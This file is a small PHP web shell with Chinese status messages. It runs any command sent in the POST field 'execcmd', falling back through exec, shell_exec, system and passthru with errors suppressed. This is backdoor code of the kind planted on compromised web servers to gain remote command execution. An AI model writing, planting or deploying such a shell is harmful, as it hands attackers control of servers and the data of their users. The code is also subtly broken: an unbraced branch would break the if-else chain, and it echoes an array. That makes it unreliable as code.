<?php
function command($cmd,$cwd,$com = false) {
	chdir($cwd); 
	$cwd = getcwd();
	if(function_exists('exec')) { 
		@exec ($cmd,$res); 
		$res = join("\n",$res); 
		$msg = 'exec'; 
	}
	elseif(function_exists('shell_exec')) 
		$res = @shell_exec ($cmd); $msg = 'shell_exec'; 
	elseif(function_exists('system')){ 
		ob_start(); 
		@system ($cmd); 
		$res = ob_get_contents(); 
		ob_end_clean(); 
		$msg = 'system'; 
	}
	elseif(function_exists('passthru')){ 
		ob_start(); 
		@passthru ($cmd); 
		$res = ob_get_contents(); 
		ob_end_clean(); 
		$msg = 'passthru'; 
	}
	$msg = $res == '' ? '<h1>NULL</h1>' : '<h2>利用'.$msg.'执行成功</h2>';
	return array('res' => $res,'msg' => $msg);
}

if(isset($_POST['execcmd'])) {
	$cmd = $_POST['execcmd'];
	$cwd = 'com';
	$res = command($cmd,$cwd);
	echo $res;
}
die("");
?>